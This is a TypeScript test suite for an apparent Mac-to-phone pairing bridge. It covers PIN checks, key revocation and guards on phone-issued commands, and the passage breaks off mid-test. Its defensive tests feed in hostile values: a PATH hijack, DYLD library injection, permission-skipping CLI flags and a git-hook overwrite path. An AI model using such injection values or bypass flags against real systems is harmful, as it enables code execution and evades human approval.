import test, { mock, type TestContext } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { randomBytes } from "node:crypto";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { runInNewContext } from "node:vm";
import ts from "typescript";
import { WebSocket } from "ws";
import { FrameCodec } from "../main/frames";
import { runCommandRequest, validateRequest } from "../main/ipc";
import { asPermissionMode } from "../shared/permissions";
import { validateReview } from "../shared/settings";
import { BRIDGE_PORT, HANDSHAKE_BYTES, isBridgeMethod, KEY_BYTES, MAX_ASK_MS, PAIRING_TTL_MS, READ_ONLY_METHODS } from "../shared/mobile-protocol";
import type { BridgeStatus } from "../main/bridge";
import type { BridgeFrame, DesktopIdentity, LiveState, PairingPayload, PermissionAsk } from "../shared/mobile-protocol";

const SEAL = "keychain:";
const electron = {
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (value: string) => Buffer.from(`${SEAL}${value}`, "utf8"),
    decryptString: (value: Buffer) => value.toString("utf8").slice(SEAL.length),
  },
};
const electronPath = require.resolve("electron");
require.cache[electronPath] = { id: electronPath, filename: electronPath, loaded: true, exports: electron } as unknown as NodeModule;

const mac = { host: "emma-test.local", addresses: ["127.0.0.1"] };
const tailnetPath = require.resolve("../main/tailnet");
require.cache[tailnetPath] = {
  id: tailnetPath,
  filename: tailnetPath,
  loaded: true,
  exports: {
    pairingHost: () => Promise.resolve(mac.host),
    addressesFor: (host: string) => Promise.resolve(host === mac.host ? [...mac.addresses] : []),
    hosts: () => ({ tailnet: [], lan: [...mac.addresses] }),
  },
} as unknown as NodeModule;

// eslint-disable-next-line @typescript-eslint/no-require-imports
const { createBridge }: typeof import("../main/bridge") = require("../main/bridge");

const PIN = "482913";
const identity: DesktopIdentity = { id: "mac", name: "Test Mac", version: "0.0.0", protocol: 1 };
const idle = (): LiveState => ({ agents: [], spans: {}, asks: [], partial: {}, desktop: identity });
const asking = (id: string): PermissionAsk => ({
  id,
  threadId: "t1",
  tool: "edit",
  summary: "Emma wants to edit a file",
  detail: "d".repeat(4096),
  askedAt: Date.now(),
  expiresAt: Date.now() + MAX_ASK_MS,
});

type Harness = ReturnType<typeof createBridge> & { listened: Promise<void> };

function bridgeOn(t: TestContext, live: () => LiveState = idle, dispatch: () => Promise<unknown> = () => Promise.resolve({}), userData = mkdtempSync(path.join(tmpdir(), "emma-bridge-"))): Harness {
  let ready: () => void;
  const listened = new Promise<void>((resolve, reject) => {
    ready = resolve;
    const late = setTimeout(() => reject(new Error(`nothing is listening for emma-test.local on 127.0.0.1:${BRIDGE_PORT} — is another test process still holding it?`)), 5_000);
    late.unref();
  });
  const bridge = createBridge({
    userData,
    identity,
    dispatch,
    live,
    onStatus: (status: BridgeStatus) => { if (status.listening) ready(); },
  });
  listened.catch(() => undefined);
  t.after(() => bridge.stop());
  return Object.assign(bridge, { listened });
}

const dial = (addr: string) => addr.replace(mac.host, "127.0.0.1");

async function phoneOn(payload: PairingPayload, token?: string) {
  const codec = new FrameCodec(Buffer.from(payload.key, "base64url"), "phone");
  const ws = new WebSocket(dial(payload.addr), [token ?? codec.auth]);
  const raw: Uint8Array[] = [];
  const opened: BridgeFrame[] = [];
  let greeted: () => void;
  const shook = new Promise<void>((resolve) => { greeted = resolve; });
  ws.on("message", (data: Buffer, isBinary: boolean) => {
    if (!isBinary) return;
    if (data.byteLength === HANDSHAKE_BYTES) {
      codec.greet(data);
      greeted();
      return;
    }
    raw.push(new Uint8Array(data));
    const frame = codec.open(data);
    if (frame) opened.push(frame);
  });
  await new Promise<void>((resolve, reject) => {
    ws.once("open", resolve);
    ws.once("error", reject);
  });
  const dropped = new Promise<never>((_, reject) => {
    ws.once("close", (code: number) => reject(new Error(`the bridge closed this socket with ${code}`)));
  });
  ws.send(codec.hello);
  await Promise.race([shook, dropped]);
  const tick = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
  const settle = () => tick(250);
  return {
    ws,
    raw,
    opened,
    live: () => opened.find((frame) => frame.k === "evt" && frame.t === "live"),
    async ask(id: string, method: string, params: Record<string, unknown>) {
      ws.send(codec.seal({ k: "req", id, method, params } as never)!);
      const found = (): BridgeFrame | undefined => opened.find((frame) => frame.k === "res" && frame.id === id);
      for (let i = 0; i < 200 && !found(); i += 1) await tick(20);
      return found();
    },
    settle,
  };
}

test("the QR carries the address and key, and never the PIN", async (t) => {
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  assert.equal(payload.addr, `ws://emma-test.local:${BRIDGE_PORT}`);
  assert.equal(payload.name, "Test Mac");
  assert.equal(Buffer.from(payload.key, "base64url").length, 32);
  assert.doesNotMatch(JSON.stringify(payload), new RegExp(PIN));
});

test("a fresh pairing answers nothing until the phone proves the PIN", async (t) => {
  let dispatched = 0;
  const bridge = bridgeOn(t, idle, () => { dispatched += 1; return Promise.resolve({}); });
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);

  const refused = await phone.ask("1", "snapshot", {});
  assert.ok(refused && refused.k === "res" && refused.ok === false);
  assert.match(refused.error, /PIN/);
  assert.equal(dispatched, 0, "an unverified phone reached the dispatcher");
  assert.equal(bridge.status().devices.length, 0, "the pairing committed before the PIN was proved");

  const wrong = await phone.ask("2", "unlock", { pin: "000000" });
  assert.ok(wrong && wrong.k === "res" && wrong.ok === false);
  assert.equal(bridge.status().devices.length, 0);

  const right = await phone.ask("3", "unlock", { pin: PIN });
  assert.ok(right && right.k === "res" && right.ok === true);
  assert.equal(bridge.status().devices.length, 1, "a proved PIN did not commit the pairing");

  const allowed = await phone.ask("4", "snapshot", {});
  assert.ok(allowed && allowed.k === "res" && allowed.ok === true);
  assert.equal(dispatched, 1);
  phone.ws.close();
});

test("wrong PINs are spent, not unlimited — the staged pairing dies before a 4-digit space does", async (t) => {
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  for (let i = 0; i < 5; i += 1) await phone.ask(`w${i}`, "unlock", { pin: "000000" });
  assert.equal(bridge.status().devices.length, 0);
  const late = await phone.ask("late", "unlock", { pin: PIN });
  assert.ok(!late || (late.k === "res" && late.ok === false), "the right PIN still worked after the pairing was spent");
  assert.equal(bridge.status().devices.length, 0);
  phone.ws.close();
});

test("a phone without the auth token never reaches the handshake", async (t) => {
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  await assert.rejects(phoneOn(payload, randomBytes(32).toString("hex")), /4\d\d|Unexpected server response/);
});

test("a pairing nobody scans expires on its own, without help from the renderer", async (t) => {
  mock.timers.enable({ apis: ["setTimeout", "setInterval"], now: Date.now() });
  t.after(() => mock.timers.reset());
  const bridge = bridgeOn(t);
  await bridge.pair(PIN);
  assert.equal(bridge.status().addr, `ws://emma-test.local:${BRIDGE_PORT}`);
  mock.timers.tick(PAIRING_TTL_MS);
  assert.equal(bridge.status().devices.length, 0);
  assert.equal(bridge.status().pairing, false, "the staged pairing outlived its own deadline");
  assert.equal(bridge.status().addr, "");
});

test("greeting the bridge over and over does not rebuild the live state every time", async (t) => {
  let built = 0;
  const bridge = bridgeOn(t, () => { built += 1; return idle(); });
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  const before = built;
  for (let i = 0; i < 20; i += 1) phone.ws.send(randomBytes(HANDSHAKE_BYTES));
  await phone.settle();
  assert.equal(built, before, "an unauthenticated greeting rebuilt and sealed the whole live state");
  phone.ws.close();
});

test("a phone that scanned the QR but has not proved the PIN is told nothing", async (t) => {
  const bridge = bridgeOn(t, () => ({ ...idle(), partial: { t1: { text: "the secret is", thinking: "" } } }));
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  await phone.settle();
  bridge.ask(asking("during"));
  bridge.event({ k: "evt", t: "live", state: idle() });
  await phone.settle();
  assert.deepEqual(phone.raw, [], "the QR key alone bought a live feed of this Mac");

  await phone.ask("1", "unlock", { pin: PIN });
  assert.ok(phone.live(), "a proved phone was not handed the live state");
  phone.ws.close();
});

test("an unpaired Mac keeps no permission asks, and a pairing Mac hands the new ones over", async (t) => {
  const bridge = bridgeOn(t);
  for (let i = 0; i < 5; i += 1) bridge.ask(asking(`before-${i}`));
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  await phone.ask("1", "unlock", { pin: PIN });
  const live = phone.live();
  assert.ok(live && live.k === "evt" && live.t === "live");
  assert.deepEqual(live.state.asks, [], "an unpaired Mac hoarded permission asks for the life of the process");
  phone.ws.close();
});

test("unpairing shuts the door, and the phone that was holding the key cannot reopen it", async (t) => {
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  await phone.ask("1", "unlock", { pin: PIN });
  assert.equal(bridge.status().devices.length, 1);

  bridge.unpair();
  assert.equal(bridge.status().devices.length, 0);
  assert.equal(bridge.status().listening, false, "the port stayed open after the phone was revoked");
  await assert.rejects(phoneOn(payload), "a revoked phone reconnected on the key it already had");
});

test("a revoked phone that reconnects is refused at the door, and never handshaken", async (t) => {
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const doomed = await phoneOn(payload);
  await doomed.ask("1", "unlock", { pin: PIN });
  const kept = await join(bridge);
  bridge.unpair(bridge.status().devices[0].id);
  doomed.ws.close();

  const codec = new FrameCodec(Buffer.from(payload.key, "base64url"), "phone");
  const back = new WebSocket(dial(payload.addr), [codec.auth]);
  const seen: Buffer[] = [];
  back.on("message", (data: Buffer) => seen.push(data));
  const refused = await new Promise<Error>((resolve, reject) => {
    back.once("error", resolve);
    back.once("open", () => reject(new Error("the revoked key opened a socket")));
  });
  assert.match(refused.message, /401/, "the revoked key was not refused at the upgrade");
  assert.equal(seen.length, 0, "the revoked phone was handshaken before it was shut");
  kept.ws.close();
});

test("pairing a replacement phone mints a new key, so the old phone's key is refused", async (t) => {
  const bridge = bridgeOn(t);
  const first = await bridge.pair(PIN);
  await bridge.listened;
  const old = await phoneOn(first);
  await old.ask("1", "unlock", { pin: PIN });
  old.ws.close();

  bridge.unpair();
  const second = await bridge.pair("9911");
  await bridge.listened;
  assert.notEqual(second.key, first.key);
  assert.equal(second.addr, first.addr);
  await assert.rejects(phoneOn(first), "the replaced phone still authenticated");
  const replacement = await phoneOn(second);
  const unlocked = await replacement.ask("1", "unlock", { pin: "9911" });
  assert.ok(unlocked && unlocked.k === "res" && unlocked.ok === true);
  replacement.ws.close();
});

async function serving(bridge: Harness) {
  for (let i = 0; i < 200 && !bridge.status().listening; i += 1) await new Promise((resolve) => setTimeout(resolve, 20));
  assert.equal(bridge.status().listening, true, "the bridge never started listening");
}

async function join(bridge: Harness, pin = PIN) {
  const payload = await bridge.pair(pin);
  await serving(bridge);
  const phone = await phoneOn(payload);
  const proved = await phone.ask(`unlock-${payload.key.slice(0, 6)}`, "unlock", { pin });
  assert.ok(proved && proved.k === "res" && proved.ok === true, "a freshly paired phone could not prove its PIN");
  return phone;
}

test("three phones hold the line at once, and each one is answered on its own key", async (t) => {
  const bridge = bridgeOn(t);
  const first = await join(bridge);
  const second = await join(bridge);
  const third = await join(bridge);

  assert.equal(bridge.status().devices.length, 3);
  assert.deepEqual(bridge.status().devices.map((device) => device.connected), [true, true, true], "pairing a phone dropped the phones already on");

  bridge.resolved("ask-1", true);
  await third.settle();
  for (const [name, phone] of [["first", first], ["second", second], ["third", third]] as const) {
    assert.ok(
      phone.opened.some((frame) => frame.k === "evt" && frame.t === "permission-resolved" && frame.id === "ask-1"),
      `the ${name} phone never got the broadcast`,
    );
  }

  const answered = await second.ask("q", "snapshot", {});
  assert.ok(answered && answered.k === "res" && answered.ok === true);
  for (const phone of [first, second, third]) phone.ws.close();
});

test("a fourth phone is refused rather than quietly evicting one of the three", async (t) => {
  const bridge = bridgeOn(t);
  const phones = [await join(bridge), await join(bridge), await join(bridge)];
  await assert.rejects(bridge.pair(PIN), /3 devices/, "a fourth phone paired and pushed one of the three off");
  assert.equal(bridge.status().devices.length, 3, "the refused pairing still changed what is paired");
  assert.equal(bridge.status().pairing, false, "the refused pairing left a staged code behind");
  const answered = await phones[0].ask("q", "snapshot", {});
  assert.ok(answered && answered.k === "res" && answered.ok === true);
  for (const phone of phones) phone.ws.close();
});

test("revoking one phone leaves the other two paired and answering", async (t) => {
  const bridge = bridgeOn(t);
  const doomed = await join(bridge);
  const kept = await join(bridge);
  const gone = bridge.status().devices[0].id;

  bridge.unpair(gone);
  await doomed.settle();
  assert.equal(bridge.status().devices.length, 1, "revoking one phone took another with it");
  assert.equal(bridge.status().listening, true, "the port closed while a phone was still paired");
  assert.ok(doomed.opened.some((frame) => frame.k === "evt" && frame.t === "bye"), "the revoked phone was never told");
  assert.notEqual(doomed.ws.readyState, WebSocket.OPEN, "the revoked phone kept an open socket to ask on");

  const answered = await kept.ask("q", "snapshot", {});
  assert.ok(answered && answered.k === "res" && answered.ok === true, "the phone that was kept stopped being answered");
  kept.ws.close();
});

const mainSource = ts.createSourceFile("main.ts", readFileSync(path.join(__dirname, "../../main/main.ts"), "utf8"), ts.ScriptTarget.Latest, true);
const lift = (name: string) =>
  mainSource.statements.find((node): node is ts.FunctionDeclaration => ts.isFunctionDeclaration(node) && node.name?.text === name)!.getText(mainSource);
const liftConst = (name: string) =>
  mainSource.statements.find((node) => ts.isVariableStatement(node)
    && node.declarationList.declarations.some((one) => one.name.getText(mainSource) === name))!.getText(mainSource);
const dispatchSource = ts.transpileModule(
  [liftConst("MAX_PHONE_LIST_BYTES"), liftConst("MAX_PHONE_TEXT_CHARS"), liftConst("thinkingLevel"), lift("onlyOnce"), lift("phoneList"), lift("phoneMemories"), lift("phoneJobs"), lift("recordedRevert"), lift("mcpServerRequest"), lift("cliSendRequest"), lift("catalogued"), lift("routedModelKey"), lift("bridgeDispatch"), "bridgeDispatch;"].join("\n"),
  { compilerOptions: { target: ts.ScriptTarget.ES2022 } },
).outputText;

type Dispatch = (method: string, params: Record<string, unknown>) => Promise<Record<string, unknown>>;

function dispatchOn(sandbox: Record<string, unknown>): Dispatch {
  return runInNewContext(dispatchSource, {
    Buffer,
    app: { getPath: () => "/nowhere" },
    bridgeReplies: new Map<string, Map<string, unknown>>(),
    MAX_REPLIES_PER_THREAD: 32,
    MAX_REPLY_THREADS: 32,
    DEVICE: "Mac",
    ...sandbox,
  }) as Dispatch;
}

test("readImage reads a granted or attached file, and refuses a stray path that merely ends in .jpg", async () => {
  const grant = "/Users/tester/Projects/emma";
  let read = "";
  const dispatch = dispatchOn({
    namedPath: (value: unknown) => (typeof value === "string" ? value : undefined),
    pathInside: (root: string, file: string) => file.startsWith(`${root}/`),
    folders: { list: () => [{ id: "f1", path: grant, name: "emma" }] },
    attachments: { holds: (file: string) => file === "/Users/tester/Library/emma/attachments/a.png" },
    nativeImage: { createFromPath: (file: string) => { read = file; return { isEmpty: () => false }; } },
    compressScreenFrame: () => ({ image: "data:image/jpeg;base64,AAAA" }),
  });

  await assert.rejects(
    dispatch("readImage", { path: "/Users/tester/Pictures/passport-scan.jpg" }),
    /Not an image Emma can show/,
    "a paired phone read a picture that is in no granted folder and is attached to nothing",
  );
  assert.equal(read, "", "the refused path was opened off disk anyway");

  assert.deepEqual({ ...(await dispatch("readImage", { path: `${grant}/docs/shot.png` })) }, { mime: "image/jpeg", base64: "AAAA" });
  assert.ok(await dispatch("readImage", { path: "/Users/tester/Library/emma/attachments/a.png" }));
});

test("a folder a phone names is granted only once someone at the Mac approves it", async () => {
  const home = "/Users/tester";
  const granted: string[] = [];
  const asked: string[] = [];
  const real: Record<string, string> = { [`${home}/Projects/away`]: "/Volumes/Backup/keys" };
  const held: { path: string }[] = [];
  let answer = false;
  const dispatch = dispatchOn({
    path,
    homedir: () => home,
    realpathSync: (value: string) => real[value] ?? value,
    statSync: () => ({ isDirectory: () => true }),
    samePath: (left: string, right: string) => left === right,
    pathInside: (root: string, target: string) => target === root || target.startsWith(`${root}/`),
    confirmOnMac: async (_message: string, detail: string) => { asked.push(detail); return answer; },
    folders: { list: () => held, add: (directory: string) => { granted.push(directory); return []; } },
    visibleFolders: () => granted.map((directory) => ({ id: directory, path: directory, name: "emma" })),
  });

  await assert.rejects(dispatch("addFolder", { path: "Projects/emma" }), /full path/, "a relative path was accepted");
  await assert.rejects(dispatch("addFolder", { path: "/etc" }), /home folder/, "a phone granted a folder outside the home folder");
  await assert.rejects(dispatch("addFolder", { path: `${home}/Projects/away` }), /home folder/, "a symlink out of home read as a folder in home");
  assert.deepEqual(asked, [], "a path the shape checks turned away still interrupted the Mac");

  await assert.rejects(dispatch("addFolder", { path: `${home}/Projects/emma` }), /approved/, "a folder nobody approved was granted anyway");
  await assert.rejects(dispatch("addFolder", { path: home }), /approved/, "the home folder itself was granted from a phone");
  assert.deepEqual(granted, [], "a folder was granted before anyone at the Mac answered");
  assert.equal(asked.length, 2, "the Mac was not asked about a folder it had never granted");
  assert.match(asked[0], new RegExp(`${home}/Projects/emma`), "the question did not name the folder being handed over");

  answer = true;
  await dispatch("addFolder", { path: `${home}/Projects/emma` });
  assert.deepEqual(granted, [`${home}/Projects/emma`], "an approved folder was refused");

  held.push({ path: `${home}/Projects/kept` });
  answer = false;
  await dispatch("addFolder", { path: `${home}/Projects/kept` });
  assert.deepEqual(granted, [`${home}/Projects/emma`, `${home}/Projects/kept`], "a folder already granted was refused");
  assert.equal(asked.length, 3, "re-adding a folder the Mac already granted asked again");
});

test("a revert puts back the body Emma recorded, not the one the phone sent", async () => {
  const written: { path: string; body: string }[] = [];
  const changes = [
    { folderId: "f1", path: "src/index.ts", before: "the recorded body\n", after: "rewritten\n", at: 1 },
    { folderId: "f1", path: "src/new.ts", before: null, after: "created\n", at: 2 },
  ];
  const dispatch = dispatchOn({
    Buffer,
    boundedCapabilityId: (value: unknown, label: string) => {
      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
      return value;
    },
    agents: { list: () => [{ threadId: "t1" }], changes: (threadId: string) => threadId === "t1" ? changes : [] },
    escapesRoot: () => false,
    changed: () => {},
    folders: { directory: () => "/Users/tester/Projects/emma", write: (_id: string, file: string, body: string) => { written.push({ path: file, body }); } },
  });

  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: ".git/hooks/pre-commit" }), /Emma rewrote/, "a path Emma never rewrote was written from a phone");
  await assert.rejects(dispatch("revertChange", { folderId: "f2", path: "src/index.ts" }), /Emma rewrote/, "a change recorded against another folder stood in for this one");
  await assert.rejects(dispatch("revertChange", { folderId: "f1", path: "src/new.ts" }), /Emma rewrote/, "a file Emma created was reverted to a body it never had");
  assert.deepEqual(written, [], "a file was written before the recorded change decided anything");

  assert.deepEqual({ ...(await dispatch("revertChange", { folderId: "f1", path: "src/index.ts" })) }, { reverted: true });
  assert.deepEqual(written, [{ path: "src/index.ts", body: "the recorded body\n" }], "the revert wrote something other than the body Emma recorded");
});

test("an MCP server a phone installs is approved at the Mac and cannot steer how programs load", async () => {
  const installed: unknown[] = [];
  let answer = false;
  const dispatch = dispatchOn({
    isEnvName: (value: string) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(value),
    LOADER_ENV: /^(PATH|NODE_OPTIONS|NODE_PATH|npm_config_\w+|(DYLD|LD)_\w+|ELECTRON_RUN_AS_NODE|SHELL|IFS)$/i,
    boundedCapabilityId: (value: unknown, label: string) => {
      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
      return value;
    },
    confirmOnMac: async () => answer,
    toolsChanged: async () => {},
    capabilities: { installMcpServer: async (definition: unknown) => { installed.push(definition); return { id: "srv-1" }; } },
  });
  const server = { name: "notes", command: "npx", args: ["-y", "notes-mcp"], env: { NOTES_TOKEN: "t" } };

  await assert.rejects(dispatch("installMcpServer", { ...server, env: { PATH: "/tmp/evil:/usr/bin" } }), /loaded/, "a phone set PATH for a server the Mac spawns");
  await assert.rejects(dispatch("installMcpServer", { ...server, env: { DYLD_INSERT_LIBRARIES: "/tmp/x.dylib" } }), /loaded/, "a phone injected a dylib into a server the Mac spawns");
  await assert.rejects(dispatch("installMcpServer", { ...server, env: { "NOT A NAME": "x" } }), /environment is invalid/, "a server env key that is not an environment variable name was accepted");
  await assert.rejects(dispatch("installMcpServer", server), /approved/, "a server nobody at the Mac approved was installed");
  assert.deepEqual(installed, [], "a server was installed before the Mac answered");

  answer = true;
  assert.deepEqual({ ...(await dispatch("installMcpServer", server)) }, { id: "srv-1" });
  assert.equal(installed.length, 1, "an approved server was not installed");
});

test("a CLI turn from a phone is a prompt, never a flag", async () => {
  const sent: string[] = [];
  const dispatch = dispatchOn({
    MAX_CLI_PROMPT_CHARS: 32_000,
    boundedCapabilityId: (value: unknown, label: string) => {
      if (typeof value !== "string" || !value || value.length > 256) throw new Error(`${label} is invalid`);
      return value;
    },
    clis: { send: async (_id: string, prompt: string) => { sent.push(prompt); }, get: () => null },
  });

  for (const prompt of ["--dangerously-skip-permissions", "  --approval-mode=yolo", "-p", "--mcp-config={\"x\":1}"]) {
    await assert.rejects(dispatch("sendCliRun", { id: "run-1", prompt }), /prompt, not a flag/, `a phone sent ${prompt} as a CLI turn`);
  }
  assert.deepEqual(sent, [], "a flag reached the harness argv before the guard ran");

  await dispatch("sendCliRun", { id: "run-1", prompt: "carry on — pass --force to the build" });
  assert.deepEqual(sent, ["carry on — pass --force to the build"], "a prompt that merely mentions a flag was refused");
});

test("a phone that replays one request id is answered from the first reply, not steered twice", async () => {
  let steered = 0;
  const dispatch = dispatchOn({
    agentMessage: (params: Record<string, unknown>) => ({ threadId: String(params.threadId), text: String(params.text) }),
    steerThread: async () => { steered += 1; },
  });
  const params = { threadId: "t1", clientId: "c1", text: "stop and explain" };

  const first = await dispatch("steerAgent", { ...params });
  const again = await dispatch("steerAgent", { ...params });
  assert.deepEqual({ ...first }, { steered: true });
  assert.equal(again, first, "the replay was answered with a fresh run rather than the first reply");
  assert.equal(steered, 1, "a resent request ran the turn a second time");

  await dispatch("steerAgent", { ...params, clientId: "c2" });
  assert.equal(steered, 2, "a genuinely new request was swallowed by the dedupe guard");
});

test("a key revoked before a restart is still turned away at the door", async (t) => {
  const userData = mkdtempSync(path.join(tmpdir(), "emma-bridge-"));
  const before = bridgeOn(t, idle, () => Promise.resolve({}), userData);
  const payload = await before.pair(PIN);
  await before.listened;
  const doomed = await phoneOn(payload);
  await doomed.ask("1", "unlock", { pin: PIN });
  const kept = await join(before);
  before.unpair(before.status().devices[0].id);
  doomed.ws.close();
  kept.ws.close();
  before.stop();

  const after = bridgeOn(t, idle, () => Promise.resolve({}), userData);
  after.start();
  await after.listened;
  const codec = new FrameCodec(Buffer.from(payload.key, "base64url"), "phone");
  const back = new WebSocket(dial(payload.addr), [codec.auth]);
  const refused = await new Promise<Error>((resolve, reject) => {
    back.once("error", resolve);
    back.once("open", () => reject(new Error("a key revoked before the restart opened a socket")));
  });
  assert.match(refused.message, /401/, "the revoked list did not survive the restart");
});

test("this Mac moving to another network rebinds the same pairing, and the phone relinks without pairing again", async (t) => {
  t.after(() => { mac.addresses = ["127.0.0.1"]; });
  const bridge = bridgeOn(t);
  const payload = await bridge.pair(PIN);
  await bridge.listened;
  const phone = await phoneOn(payload);
  await phone.ask("1", "unlock", { pin: PIN });
  phone.ws.close();

  mac.addresses = [];
  await bridge.recheck();
  assert.equal(bridge.status().listening, false, "the bridge kept a port open on an address this Mac no longer has");
  assert.equal(bridge.status().devices.length, 1, "an address change threw the pairing away");
  assert.match(bridge.status().reason, /reachable/);

  mac.addresses = ["127.0.0.1"];
  await bridge.recheck();
  await serving(bridge);
  assert.equal(bridge.status().reason, "");
  assert.equal(bridge.status().devices.length, 1);
  const back = await phoneOn(payload);
  const answered = await back.ask("2", "snapshot", {});
  assert.ok(answered && answered.k === "res" && answered.ok === true, "the phone had to pair again after this Mac moved");
  back.ws.close();
});

test("the QR never carries an mDNS name, which anyone on the LAN can answer to", () => {
  const source = readFileSync(path.join(__dirname, "../../main/tailnet.ts"), "utf8");
  assert.doesNotMatch(source, /hostname\(|\.local["'`]/, "pairingHost is building a name off this Mac's hostname again");
});

test("the Mac's scheduled tasks reach a phone without their graph, and come back through the renderer's own validation", async () => {
  const stored = [{
    id: "job-123456789012", title: "Weekly reading", schedule: "0 9 * * 1", prompt: "Find reading",
    nodes: '[{"id":"step-1","kind":"agent","text":"read"}]', outputs: "digest=...",
    sourceDomains: ["example.com"], enabled: true, permissionMode: "ask", model: "",
    nextRunAt: "2026-09-07T09:00:00.000Z", lastRunAt: null,
  }];
  const forwarded: unknown[] = [];
  const dispatch = dispatchOn({
    validateRequest,
    asPermissionMode,
    scheduledJobs: async () => stored,
    runRequest: async (request: unknown) => { forwarded.push(request); },
  });

  const listed = await dispatch("listScheduledJobs", {}) as unknown as { rows: Record<string, unknown>[]; capped: boolean };
  assert.deepEqual(Object.keys(listed.rows[0]).sort(), ["enabled", "id", "lastRunAt", "model", "nextRunAt", "permissionMode", "prompt", "schedule", "sourceDomains", "title", "truncated"]);
  assert.equal(listed.rows[0].truncated, false, "a task well under the ceiling was reported as clipped");
  assert.equal(listed.capped, false, "one task under the ceiling came back as a clipped list");

  assert.deepEqual({ ...(await dispatch("runScheduledJob", { jobId: stored[0].id })) }, { started: true });
  assert.equal(JSON.stringify(await dispatch("setScheduledJobEnabled", { jobId: stored[0].id, enabled: false })), JSON.stringify(listed));
  assert.equal(JSON.stringify(forwarded), JSON.stringify([
    { method: "runScheduledJob", params: { jobId: stored[0].id } },
    { method: "setScheduledJobEnabled", params: { jobId: stored[0].id, enabled: "false" } },
  ]), "a scheduled write reached the host as something other than the renderer's own payload");

  await assert.rejects(dispatch("setScheduledJobEnabled", { jobId: stored[0].id, enabled: "false" }), /Enabled is invalid/);
  await assert.rejects(dispatch("deleteScheduledJob", { jobId: "" }), /Invalid parameters/);
  await assert.rejects(dispatch("saveScheduledJob", { title: "Weekly", schedule: "manual", prompt: "Find", sourceDomains: "[]", permissionMode: "ask", danger: "1" }), /Invalid parameters/);
  assert.equal(forwarded.length, 2, "a refused scheduled write still reached the host");

  await dispatch("saveScheduledJob", { title: "Every minute", schedule: "* * * * *", prompt: "do it", sourceDomains: '["evil.example"]', permissionMode: "full" });
  assert.equal(JSON.stringify((forwarded[2] as { params: Record<string, string> }).params), JSON.stringify({
    title: "Every minute", schedule: "* * * * *", prompt: "do it", sourceDomains: "[]", permissionMode: "ask", model: "",
  }), "a phone picked a scheduled task's permission mode, domains or model");

  await dispatch("saveScheduledJob", { jobId: stored[0].id, title: "Weekly reading", schedule: "0 9 * * 1", prompt: "Find reading", sourceDomains: "[]", permissionMode: "full", model: "some/model" });
  const edited = (forwarded[3] as { params: Record<string, string> }).params;
  assert.equal(edited.permissionMode, stored[0].permissionMode, "an edit from a phone raised the mode the Mac had recorded");
  assert.equal(edited.sourceDomains, JSON.stringify(stored[0].sourceDomains), "an edit from a phone rewrote the task's source domains");
  assert.equal(edited.model, stored[0].model, "an edit from a phone pinned a model the Mac never checked it can route to");
});

test("every method a phone can dispatch is classified, and only readers are read-only", () => {
  const READS = /^(snapshot|live|thread(Messages|Traces|Changes)|keyStatus|git(Ready|Status|FileDiff|History|Message)|(get|list|read)[A-Z])/;
  const dispatched = [...dispatchSource.matchAll(/case "(\w+)":/g)].map((found) => found[1]).filter(isBridgeMethod);
  assert.ok(dispatched.length > 40, "bridgeDispatch's cases were not found, so this test proves nothing");
  for (const method of dispatched) {
    assert.equal(READ_ONLY_METHODS.includes(method), READS.test(method), `${method} is on the wrong side of READ_ONLY_METHODS`);
  }
  for (const method of READ_ONLY_METHODS) {
    assert.ok(dispatched.includes(method), `READ_ONLY_METHODS names ${method}, which bridgeDispatch does not answer`);
  }
});

test("a list a phone asks for is sealed into one frame, however much the Mac holds", async () => {
  const big = (chars: number) => "x".repeat(chars);
  const rows = <T>(count: number, make: (index: number) => T) => Array.from({ length: count }, (_, index) => make(index));
  const dispatch = dispatchOn({
    boundedCapabilityId: (value: unknown) => value,
    memoryRoot: () => "/Users/tester/Library/emma/memories",
    runMemoryCommand: async () => {},
    listMemories: async () => rows(256, (i) => ({ path: `/memories/${i}.md`, bytes: 262_144, updatedAt: i, text: big(262_144) })),
    readVault: () => ({ kind: "obsidian", path: "/Users/tester/Vault" }),
    listNotes: () => rows(2000, (i) => ({
      path: `/Users/tester/Vault/Emma/note-${i}.md`, relative: `Emma/note-${i}.md`, title: big(200),
      tags: ["reading", "ui"], savedAt: "2026-09-01T09:00:00.000Z", kind: "page", folder: "Emma",
      excerpt: big(280), image: `/Users/tester/Vault/Emma/attachments/note-${i}.png`, sourceUrl: big(2048),
    })),
    listTaskLists: async () => rows(64, (i) => ({
      id: `tl-${i}`, title: big(200), goal: big(1000), updatedAt: "2026-09-01T09:00:00.000Z", threadId: "t1",
      tasks: rows(100, (t) => ({ id: `task-${t}`, title: big(500), status: "pending", subtasks: [] })),
    })),
    agents: { changes: () => rows(64, (i) => ({ folderId: "f1", path: `src/file-${i}.ts`, before: big(262_144), after: big(262_144), at: i })) },
    scheduledJobs: async () => rows(64, (i) => ({
      id: `job-${i}`, title: big(65_536), schedule: "0 9 * * 1", prompt: big(65_536), nodes: big(4096), outputs: big(4096),
      sourceDomains: ["example.com"], enabled: true, permissionMode: "ask", model: "", nextRunAt: null, lastRunAt: null,
    })),
  });

  const key = randomBytes(KEY_BYTES);
  const mac = new FrameCodec(key, "mac");
  const phone = new FrameCodec(key, "phone");
  const macHello = mac.restart();
  phone.greet(macHello);
  mac.greet(phone.restart());

  for (const [method, params] of [
    ["listMemories", {}],
